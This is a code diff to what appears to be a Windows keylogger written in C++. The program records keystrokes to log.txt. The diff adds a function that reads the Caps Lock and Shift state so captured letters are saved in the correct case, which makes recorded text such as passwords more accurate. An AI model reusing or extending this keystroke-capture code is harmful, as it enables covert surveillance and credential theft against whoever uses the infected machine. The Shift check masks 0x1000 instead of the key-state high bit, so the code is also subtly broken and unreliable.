@@ -10,6 +10,7 @@ template <class T>
 void writeToFile(T input);
 bool specialKeys(int S_Key);
 void logTime();
+void checkForLowerCase(int &key);
 
 int main()
 {
@@ -33,6 +34,7 @@ int main()
 				cout << KEY;
 				if (specialKeys(KEY) == false)
 				{
+					checkForLowerCase(KEY);
 					writeToFile(char(KEY));
 				}
 			}
@@ -62,7 +64,7 @@ void writeToFile(T input)
 
 /*
 	Method: specialKeys(int specialKey)
-	Parameters: specialKey - represents the virtual-key code used by the system
+	Parameters: specialKey - an int that represents the virtual-key code used by the system
 	Return Values: true - if the virtual-key code is a special key; false - if the virtual-key code is not a special key
 	Purpose: To write special keys into the log.txt file if found.
 */
@@ -409,4 +411,29 @@ void logTime()
 	writeToFile("\n========================\n");
 	writeToFile(time);
 	writeToFile("========================\n");
+}
+
+/*
+	Method: checkForLowerCase(int &key)
+	Parameters: key - represent an alphanumeric character
+	Return Values: Set the passed variable to lowercase when suitable
+	Purpose: To convert uppercase characters to lowercase characters when suitable
+*/
+void checkForLowerCase(int &key)
+{
+	// Capslock is toggled when the low-order bit is 1
+	bool capslockPressed = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+	// Shift is pressed when the high-order bit is 1
+	bool shiftPressed = ((GetKeyState(VK_SHIFT) & 0x1000) != 0);
+
+	// Converts uppercase character to lowercase
+	if (!capslockPressed && !shiftPressed) // When capslock and shift are not pressed
+	{
+		key = int(tolower(char(key)));
+	}
+	else if (capslockPressed && shiftPressed) // When capslock and shift are pressed
+	{
+		key = int(tolower(char(key)));
+	}
 }
